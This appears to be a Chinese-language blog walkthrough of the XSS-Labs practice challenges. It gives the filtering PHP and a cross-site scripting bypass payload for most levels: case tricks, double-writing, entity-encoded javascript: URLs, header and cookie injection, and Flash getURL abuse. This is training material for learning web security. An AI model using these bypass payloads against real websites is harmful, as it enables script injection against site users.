# XSS-Labs

## Level1

<pre class="wp-block-code"><code>url/?name=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>

## Level2

考察符号的闭合

<pre class="wp-block-code"><code>url/?keyword='"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>

## Level3

`htmlspecialchars()` 函数把预定义的字符转换为 HTML 实体。考察过滤<、>、"等的绕过。

<pre class="wp-block-code"><code>url?keyword=' autofocus onfocus=alert(1)//</code></pre>

## Level4

会删除掉<和>

<pre class="wp-block-code"><code>$str2=str_replace(">","",$str);
$str3=str_replace("&lt;","",$str2);</code></pre>

和上一关类似，构造

<pre class="wp-block-code"><code>url/?keyword=" autofocus onmouseover=alert(1)//</code></pre>

## Level5

这关会先全部转成小写，然后替换掉<script和on。

<pre class="wp-block-code"><code>$str = strtolower($_GET&#91;"keyword"]);
$str2=str_replace("&lt;script","&lt;scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);</code></pre>

利用a标签的href属性执行javascript:伪协议来绕过

<pre class="wp-block-code"><code>url/?keyword=">&lt;a href='javascript:alert(1)'></code></pre>

## Level6

替换多种关键字。

<pre class="wp-block-code"><code>$str2=str_replace("&lt;script","&lt;scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);</code></pre>

利用大写绕过。

<pre class="wp-block-code"><code>?keyword=">&lt;Script>alert(1)&lt;/script></code></pre>

## Level7

先都转成小写， 再删除多种关键字。 

<pre class="wp-block-code"><code>$str =strtolower( $_GET&#91;"keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);</code></pre>

利用双写来绕过

<pre class="wp-block-code"><code>url/?keyword=">&lt;scrscriptipt>alert(1)&lt;/scrscriptipt></code></pre>

## Level8

与上一题相比，加入了对双引号的过滤，同时对关键字进行替换。

<pre class="wp-block-code"><code>$str = strtolower($_GET&#91;"keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);</code></pre>
考虑编码绕过。可以用如下的payload：

```
java&#115;cript:alert(1)

java&#x73;cript:alert(1)

java&#x0073;cript:alert(1)

&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```



## Level9

strpos 查找 'http://'在字符串中第一次出现的位置。

<pre class="wp-block-code"><code>if(false===strpos($str7,'http://'))
{
  echo '&lt;center>&lt;BR>&lt;a href="您的链接不合法？有没有！">友情链接&lt;/a>&lt;/center>';
        }</code></pre>

结合上一关的思想，可以构造如下的payload：

<pre class="wp-block-code"><code>利用注释1：java&#x73;cript:alert(1)//http://
利用注释2：java&#x73;cript:alert(1)/*http://*/

利用回车符%0d：java&#x73;cript:%0d/http://%0dalert(1)

利用换行符%0a：java&#x73;cript:%0a/http://%0aalert(1)</code></pre>

## Level10

<pre class="wp-block-code"><code>$str = $_GET&#91;"keyword"];
$str11 = $_GET&#91;"t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("&lt;","",$str22);</code></pre>

构造payload，使得input框显现，或者编辑html。

<pre class="wp-block-code"><code>t_sort="type="text"  onclick="alert(1)</code></pre>

## Less11

<pre class="wp-block-code"><code>$str11=$_SERVER&#91;'HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("&lt;","",$str22);</code></pre>

利用bp抓包，构造

<pre class="wp-block-code"><code>Referer:"type="text" onclick="alert(1)"</code></pre>

## Level12

<pre class="wp-block-code"><code>$str11=$_SERVER&#91;'HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("&lt;","",$str22);</code></pre>

利用bp构造USER_AGENT

<pre class="wp-block-code"><code>User-Agent:"type="text" onclick="alert(1)"</code></pre>

## Level13

<pre class="wp-block-code"><code>setcookie("user", "call me maybe?", time()+3600);
$str11=$_COOKIE&#91;"user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("&lt;","",$str22);</code></pre>

这次是构造cookie

<pre class="wp-block-code"><code>Cookie:user="type="text" onclick="alert(1)";</code></pre>

## Level14

本关因**iframe**调用的文件地址失效，无法进行测试。<a href="https://www.hackersb.cn/hacker/140.html" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.hackersb.cn/hacker/140.html</a>

## Level15

看了大佬的博客才知道，是考察angular js中的ng-include问题，ng-include 指令用于包含外部的HTML文件。包含的内容将作为指定元素的子节点。ng-include属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一域名下。

构造`src='level1.php?name=<img src=x onerror=alert(1)>'`

## Level16

替换空格、Tab、/符号。

<pre class="wp-block-code"><code>$str = strtolower($_GET&#91;"keyword"]);
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace("	","&nbsp;",$str4);
echo "&lt;center>".$str5."&lt;/center>";</code></pre>

可以用%0a或%0d绕过。

<pre class="wp-block-code"><code>url/?keyword=&lt;img%0a
src=a%0a
onerror=alert(1)></code></pre>

## Level17

```
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
```

`<embed>`标签就是引入一个`swf文件`到浏览器端(火狐不支持swf)

<pre class="wp-block-code"><code>url/?arg01=1&arg02= onmouseover=alert(1)</code></pre>

## Level18

和上一题一样

## Less19

这一关涉及一种xss攻击手段叫做flash xss，学习参考<a rel="noreferrer noopener" href="https://cloud.tencent.com/developer/article/1089548" target="_blank" rel="nofollow" >https://cloud.tencent.com/developer/article/1089548</a>。要判断是否属于flash xss，需要对引用的swf文件进行反编译然后进行源码分析，安装<a rel="noreferrer noopener" href="https://github.com/jindrapetrik/jpexs-decompiler/releases/tag/version14.4.0" target="_blank" rel="nofollow" >https://github.com/jindrapetrik/jpexs-decompiler/releases/tag/version14.4.0</a>。

Flash产生的xss问题主要有两种方式：1、加载第三方资源；2、与javascript通信引发xss。

<p id="0x03-%E5%B8%B8%E8%A7%81Flash-xss%E5%88%86%E7%B1%BB%E6%80%BB%E7%BB%93">
  <strong>常见Flash xss危险函数总结</strong>
</p>

Flash提供相关的函数，可以执行js代码，`getURL`(AS2中支持)，`navigateToURL`(AS3中支持)。

`ExternalInterface.call`同样是一个Flash提供的可以执行js的接口函数， 它有两个参数，形如`ExternalInterface.call("函数名","参数1")`，Flash最后执行的JS代码是`try { __Flash__toXML(函数名("参数1")) ; } catch (e) { "<undefined/>"; }`。

`htmlText`，Flash支持在Flash里内嵌html，支持的标签img标签，a标签等。 img标签可以通过src参数引入一个Flash文件，类似与XSF一样。

`addcallback`与`lso`结合，这个问题出现的点在addCallback声明的函数，在被html界面js执行之后的返回值攻击者可控，导致了xss问题。使用lso中首先会setlso，写入脏数据，然后getlso获取脏数据。

跨站Flash即XSF，通过AS加载第三方的Flash文件，如果这个第三方Flash可以被控制，就可以实现XSF。 在AS2中使用`loadMove`函数等加载第三方Flash。

**开始复现**

参考：<a href="https://www.jianshu.com/p/4e3a517bc4ea" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.jianshu.com/p/4e3a517bc4ea</a>，首先导入xsf03.swf文件，然后定位getURL函数。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-83.png" alt="" class="wp-image-3031" width="590" height="266" /> </figure> 

追踪到sIFR的内容<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-84.png" alt="" class="wp-image-3032" width="599" height="261" /> </figure> 

得知version参数可以传入loc4变量中，即sIFR的内容中，但是getURL只在内容为link时打开，所以分析contentIsLink函数。

```php+HTML
function contentIsLink()
{
      return this.content.indexOf("<a ") == 0 && (this.content.indexOf("<a ") == this.content.lastIndexOf("<a ") && this.content.indexOf("</a>") == this.content.length - 4);
}
```


所以可以通过构造`<a>`标签来传值。payload如下：

<pre class="wp-block-code"><code>url?arg01=version&arg02=&lt;a href="javascript:alert(1)">1&lt;/a></code></pre>

## Level20

不会。。。先埋个坑吧。。。

